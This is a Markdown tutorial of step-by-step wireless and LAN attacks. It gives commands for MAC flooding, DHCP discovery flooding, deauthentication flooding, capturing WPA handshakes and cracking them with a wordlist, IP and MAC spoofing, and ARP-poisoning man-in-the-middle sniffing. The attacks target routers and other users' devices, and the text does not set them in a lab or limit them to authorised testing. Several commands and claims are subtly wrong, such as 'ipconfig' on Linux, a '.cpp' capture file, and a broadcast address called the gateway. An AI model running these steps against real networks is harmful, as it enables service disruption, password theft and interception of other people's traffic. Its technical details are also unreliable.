
# Denial-of-Service(DOS) Attack

## MAC Flooding
* Install macof
```bash
  $ apt-get install dsniff
  or
  $ apt-get install macof
```

*  Get help with macof
```bash
  $ macof --help
```

* Check if your device is connected to the network or not
```bash
  $ ifconfig
```
i) wlan0 (Confirms)
```bash
  $ iwconfig
```
ii) To attack on router copy 'ip' of __broadcast__ i.e for example 192.168.1.255


* To act as Super User
```bash
  $ sudo su -yourpassword
```

* To get MAC address of all the connected devices
```bash
  $ netdiscover
```
>***Note: 192.168.1.255 is a default gateway of a router***


* Finally, to flood the MAC Address
```bash
  $ macof -i wlan0 -s ip(e.g 192.168.1.255)
```
**ACCOMPLISHED!**

## Discovery Flooding

* Install yersinia
```bash
  $ apt-get install yersinia
```

*  Get help with yersinia
```bash
  $ yersinia -h
```

* Easy to work on GUI mode so:
```bash
  $ yersinia -G
```

1. GUI will appear 
    
   1. Send raw packets to check the connected devices.
    
        1. DHCP selected
        2. Launch Attack
        3. DHCP selected
        4. Sending raw packets

    ***Note: It will discover all the networks in the given region.***

    
   2. Select the device you want to attack

      1. Launch attack
      2. DHCP selected
      3. Sending DISCOVER Packets
    
    Tick/Check DoS
* With this Discover packets i.e huge number of ARP request is generated and router will start misbehaving.  

### For LAN Network
1. In GUI
    1. Select Edit Interface
    2. Click wlan0
    3. Launch attack and send raw packets to discover the networks connected 
    4. Select broadband (e.g 192.168.1.1)
    5. Copy MAC address of broad band
    6. Paste to the destination MAC
    7. select broad band
    8. Launch attack
    9. Send discover packets

**ACCOMPLISHED!**
     
## Deauth Flooding
* check wlan0 mode
```
 $ iwconfig
```
> Note: Mode can be Managed or Monitor but we have to configure it into Monitor mode.

* down the wireless connection
```
 $ ifconfig wlan0 down
```

* change wlan0 mode into Monitor
```
 $ iwconfig wlan0 mode monitor
```

* up the wireless connection
```
 $ ifconfig wlan0 up
```

* recheck wlan0 mode
```
 & iwconfig
```

* check networks available nearby
```
 $ airodump-ng wlan0
```

* Quite checking 
```
command + c
```

* info about network to be interrupted
```
 $ airodump-ng wlan0 -bssid (e.g 7C:A9:6B:50:43:45) --channel 11 --write (e.g test)
 ```

* start flooding the selected network 
```
 $ aireplay-ng --deauth 100(i.e no. of packets) -a (e.g 7C:A9:6B:50:43:45 i.e MAC address of Hotspot Router) -c (e.g 48:5F:99:C2:E2:BF i.e MAC address of User) wlan0
```

**ACCOMPLISHED!**

## Cracking Wifi Password

* check wlan0 mode
```
 $ iwconfig
```
> Note: Mode can be Managed or Monitor but we have to configure it into Monitor mode.

* down the wireless connection
```
 $ ifconfig wlan0 down
```

* change wlan0 mode into Monitor
```
 $ iwconfig wlan0 mode monitor
```

* up the wireless connection
```
 $ ifconfig wlan0 up
```

* recheck wlan0 mode
```
 & iwconfig
```

* check networks available nearby
```
 $ airodump-ng wlan0
```

* Quite checking 
```
command + c
```

* info about network to be interrupted
```
 $ airodump-ng wlan0 -bssid (e.g 7C:A9:6B:50:43:45) --channel 11 --write (e.g test)
 ```

* disconnect one of the user/station to get the handshake file.
> Note: The handshake file is generated when any user sends request to connect to the router.<br>

**For Handshake File**

* Open new tab in terminal and give the root access
```
 $ sudo su
```

* *Deauth flooding* is done again to disconnect the user and stopped to let the user generate the handshake file
```
$ aireplay-ng --deauth 10(i.e no of packets) -a (BSSID of Router) -c (BSSID of User)
```
* now check for handshake file<br>
> Note: Detection of the handshake file is shown in top right corner.

* list down files in new terminal and find capture file with extension '.cap'

i. For *Old Wifi-Technology* (i.e WPA) to crack we can directly use the tool aircrack-ng i.e
```
 $ aircrack-ng (.cpp file name)
```

ii. For *New Wifi-Technology* (i.e WPA2/3) to crack we use *Wordlist*
```
 $ aircrack-ng (e.g hacked-02.cap) -w 10-million-password-list-top-1000000.txt
 ```
Example of Kali-Wordlist: /usr/share/wordlists/rockyou.txt
 > Note: Sometimes rockyou.txt is zipped, so use unzip command first by changing location i.e cd

 **ACCOMPLISHED!**

 ## IP Spoofing - Stealing Other's IP

 * Root permission is given
 ```
  $ sudo su
```

* Change to real hardware interface
    1. Edit
    2. Virtual Network Editor
    3. Select Bridge Type
    4. Bridge to whichever Hardware Wifi Stick (i.e Wifi Adapter)

* Discover nearby networks
```
 $ netdiscover
```
* Ctrl + C to stop

* Now for getting others 'ip'
```
$ ipconfig wlan0(i.e your interface name) 192.168.1.1(i.e ip which you want to get)
```
**ACCOMPLISHED!**

## MAC Spoofing

* To change the MAC address
```
$ macchanger -m 7C:A9:6B:50:5C:C0(i.e MAC address you want) wlan0/eth0(i.e your device)
```
* To confirm the change
```
 $ ifconfig
```
* Replace the router with your Device/Root access
```
 $ macof -i wlan0 -s 192.168.1.1(i.e Default Router) 
```
**ACCOMPLISHED!**

## Man In The Middle Attack
* Provide root access
```
 $ sudo su
```
* Open Ettercap Tool
    1. Change primary interface wlan0
        1. check/tick
        2. full screen
    2. Press __Search__ button to check for the available networks
    3. Select the router and add it to the *target1*
    4. Select the user i.e (e.g 192.168.1.18) and add to second target
    5. Click to MITM Menu[top right corner 'O'] and select ARP poisoning
    6. Check *Sniff Remote Connection* and hit OK
    7. Confirm the work is done or not
    ```
    $ urlsnarf -i wlan0
    ```
**ACCOMPLISHED!**

-Compiled by:  
__Bibit Kunwar Chhetri__
